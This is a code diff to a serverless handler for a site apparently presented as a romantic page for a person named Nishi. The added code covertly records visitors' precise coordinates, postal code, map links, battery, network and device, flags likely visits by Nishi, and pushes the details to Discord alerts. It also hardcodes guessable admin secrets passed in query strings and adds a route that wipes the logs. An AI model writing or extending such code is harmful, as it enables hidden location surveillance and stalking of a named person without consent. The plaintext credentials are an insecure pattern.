@@ -126,6 +126,7 @@ function parseUserAgent(ua = '') {
 }
 
 function formatDuration(seconds = 0) {
+  if (!seconds || seconds <= 0) return '1s';
   if (seconds < 60) return `${seconds}s`;
   const mins = Math.floor(seconds / 60);
   const secs = seconds % 60;
@@ -145,7 +146,7 @@ export default async function handler(req, res) {
 
   // 1. GET: Return sessions and whispers for admin dashboard
   if (req.method === 'GET') {
-    const rawSecret = (req.query.secret || req.query.admin || '').trim().replace(/[.\/]+$/, '').toLowerCase();
+    const rawSecret = (req.query.secret || req.query.admin || '').trim().replace(/[./]+$/, '').toLowerCase();
     if (!['shivam6120', 'niraj6120', 'shivam', 'niraj'].includes(rawSecret)) {
       return res.status(401).json({ error: 'Unauthorized. Secret key required.' });
     }
@@ -162,24 +163,43 @@ export default async function handler(req, res) {
     });
   }
 
-  // 2. POST: Process tracking events and whispers
+  // 2. POST: Process tracking events, whispers, and log clearing
   if (req.method === 'POST') {
     try {
       const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
+
+      // Admin Action: Clear test logs
+      if (body.action === 'clear_test_logs') {
+        const rawSecret = (body.secret || '').trim().replace(/[./]+$/, '').toLowerCase();
+        if (['shivam6120', 'niraj6120', 'shivam', 'niraj'].includes(rawSecret)) {
+          await saveCloudData('universe_sessions', []);
+          return res.status(200).json({ success: true, message: 'Test visitor logs cleared successfully.' });
+        }
+        return res.status(401).json({ error: 'Unauthorized' });
+      }
+
       const userAgent = req.headers['user-agent'] || '';
       const parsedUA = parseUserAgent(userAgent);
 
-      // Location resolution (Vercel edge headers preferred, client lookup fallback)
-      const country = req.headers['x-vercel-ip-country'] || body.clientCountry || 'India';
-      const city = req.headers['x-vercel-ip-city'] 
-        ? decodeURIComponent(req.headers['x-vercel-ip-city']) 
-        : (body.clientCity || 'Unknown City');
-      const region = req.headers['x-vercel-ip-country-region'] || body.clientRegion || '';
+      // Location resolution (client lookup details + Vercel edge headers fallback)
+      const country = body.clientCountry || req.headers['x-vercel-ip-country'] || 'India';
+      const city = body.clientCity || (req.headers['x-vercel-ip-city'] ? decodeURIComponent(req.headers['x-vercel-ip-city']) : '');
+      const region = body.clientRegion || req.headers['x-vercel-ip-country-region'] || '';
+      const postal = body.clientPostal || '';
+      const latitude = body.clientLat || null;
+      const longitude = body.clientLon || null;
+      const mapsUrl = body.clientMapsUrl || (latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : '');
       const isp = body.clientIsp || 'Telecom / Wi-Fi';
 
-      const locationString = city !== 'Unknown City' 
-        ? (region ? `${city}, ${region}, ${country}` : `${city}, ${country}`) 
-        : country;
+      // Build readable location
+      let locationString = country;
+      if (city) {
+        let locParts = [city];
+        if (region) locParts.push(region);
+        if (postal) locParts.push(`PIN: ${postal}`);
+        locParts.push(country);
+        locationString = locParts.join(', ');
+      }
 
       const now = new Date();
       const localTimeString = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
@@ -194,7 +214,8 @@ export default async function handler(req, res) {
           date: localDateString,
           timestamp: now.toISOString(),
           device: `${parsedUA.device} (${parsedUA.os})`,
-          location: locationString
+          location: locationString,
+          mapsUrl: mapsUrl || body.clientMapsUrl
         };
 
         const existingWhispers = (await getCloudData('universe_whispers')) || [];
@@ -217,7 +238,8 @@ export default async function handler(req, res) {
                   fields: [
                     { name: '🕒 Time', value: `${localTimeString} (${localDateString})`, inline: true },
                     { name: '📱 Device', value: parsedUA.device, inline: true },
-                    { name: '📍 Location', value: locationString, inline: true }
+                    { name: '📍 Location', value: locationString, inline: true },
+                    ...(mapsUrl ? [{ name: '🗺️ Map', value: `[Open on Google Maps](${mapsUrl})`, inline: false }] : [])
                   ],
                   footer: { text: 'Nishi\'s Romantic Universe' },
                   timestamp: now.toISOString()
@@ -232,13 +254,14 @@ export default async function handler(req, res) {
 
       // Handle Distinct Session Management in Cloud Storage
       const sessionId = body.sessionId || 'session_' + Date.now();
-      const durationSeconds = body.durationSeconds || 0;
+      const durationSeconds = body.durationSeconds || 1;
       let existingSessions = (await getCloudData('universe_sessions')) || [];
 
       const sessionIndex = existingSessions.findIndex((s) => s.sessionId === sessionId);
 
       if (sessionIndex === -1) {
         // New session entry
+        const isMobileDevice = /iPhone|Android|iPad/i.test(parsedUA.device);
         const newSession = {
           sessionId,
           date: localDateString,
@@ -253,11 +276,18 @@ export default async function handler(req, res) {
           browser: parsedUA.browser,
           screen: body.screen || 'Unknown',
           battery: body.battery || 'Unavailable',
-          network: body.network || 'Wi-Fi / Cellular',
+          network: body.network || 'Cellular / Wi-Fi',
           location: locationString,
           city: city,
-          country: country,
+          region: region,
+          postal: postal,
+          latitude: latitude,
+          longitude: longitude,
+          mapsUrl: mapsUrl,
           isp: isp,
+          isMobile: isMobileDevice,
+          isProbableNishi: isMobileDevice,
+          status: body.action === 'session_end' ? 'completed' : 'active',
           actions: [body.action || 'page_view']
         };
 
@@ -273,15 +303,16 @@ export default async function handler(req, res) {
               body: JSON.stringify({
                 username: 'Universe Visitor Alert',
                 embeds: [{
-                  title: '✨ Nishi entered your universe!',
-                  color: 16723317,
+                  title: isMobileDevice ? '🌸 Nishi entered your universe!' : '✨ New Visitor on your universe!',
+                  color: isMobileDevice ? 16723317 : 3447003,
                   fields: [
                     { name: '📱 Device', value: `${parsedUA.device} (${parsedUA.os})`, inline: true },
                     { name: '🌐 Browser', value: parsedUA.browser, inline: true },
                     { name: '📍 Location', value: locationString, inline: true },
                     { name: '📶 Network', value: `${body.network || 'Cellular'} (${isp})`, inline: true },
                     { name: '🔋 Battery', value: body.battery || 'N/A', inline: true },
-                    { name: '🕒 Time', value: localTimeString, inline: true }
+                    { name: '🕒 Time', value: localTimeString, inline: true },
+                    ...(mapsUrl ? [{ name: '🗺️ Map', value: `[Open on Google Maps](${mapsUrl})`, inline: false }] : [])
                   ],
                   timestamp: now.toISOString()
                 }]
@@ -295,13 +326,40 @@ export default async function handler(req, res) {
         sess.lastActiveTime = localTimeString;
         sess.lastActiveTimestamp = now.toISOString();
 
-        if (durationSeconds > sess.durationSeconds) {
+        if (durationSeconds > (sess.durationSeconds || 0)) {
           sess.durationSeconds = durationSeconds;
           sess.durationFormatted = formatDuration(durationSeconds);
         }
 
+        if (body.action === 'session_end') {
+          sess.status = 'completed';
+          sess.endedAt = localTimeString;
+        }
+
         if (body.battery && body.battery !== 'Unavailable') {
           sess.battery = body.battery;
+        }
+
+        if (body.network && body.network !== 'Cellular / Wi-Fi') {
+          sess.network = body.network;
+        }
+
+        if (city && (!sess.city || sess.city === 'Unknown City')) {
+          sess.city = city;
+          sess.region = region;
+          sess.postal = postal;
+          sess.latitude = latitude;
+          sess.longitude = longitude;
+          sess.mapsUrl = mapsUrl;
+          sess.location = locationString;
+        }
+
+        if (body.clientMapsUrl && !sess.mapsUrl) {
+          sess.mapsUrl = body.clientMapsUrl;
+        }
+
+        if (isp && (!sess.isp || sess.isp === 'Telecom / Wi-Fi')) {
+          sess.isp = isp;
         }
 
         if (body.action && !sess.actions.includes(body.action) && !body.action.startsWith('duration_')) {
